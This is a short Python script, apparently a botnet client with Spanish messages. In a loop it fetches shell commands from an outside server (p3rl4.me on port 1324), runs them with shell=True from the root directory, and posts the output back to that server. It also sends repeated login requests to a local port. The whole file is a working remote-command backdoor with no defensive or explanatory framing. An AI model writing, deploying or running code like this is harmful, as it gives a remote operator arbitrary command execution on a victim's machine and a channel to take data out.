import requests
import time
import os
from urllib.request import urlopen
import multiprocessing
import subprocess
import sys


def multi():
    requests.post("http://127.0.0.1:19/login", data={'user':'user1', 'pass':'lel'})
    print("Enviado "+id)



def get_ssh():
    global command
    sshobj = urlopen('http://p3rl4.me:1324/ssh')
    command = sshobj.read().decode('utf-8')
    p1 = multiprocessing.Process(name="p1",target=run_ssh)
    if command == '':
        pass
    else:
        p1.start()


def run_ssh():
    try:
        output = subprocess.check_output(command, shell=True).decode('utf-8')
    except:
        output = "Bro, ese comando no existe"
    requests.post("http://p3rl4.me:1324/ssh", data={'ssh_output': output})

def main():
    while True:
        time.sleep(2)
        try:
            multi()
            get_ssh()
        except:
            print("Ha ocurrido un error, Seguramente el servidor no este en linea")

if __name__ == '__main__':
    os.chdir('/')
    global id
    try:
        id=str(int(sys.argv[1]))
        main()
    except KeyboardInterrupt:
        os.system('clear')
        print("CERRANDO TODO :::::.......")
    except:
        print("""Necesitas proporcionar un id numérico
Ej: python3 bot.py 1""")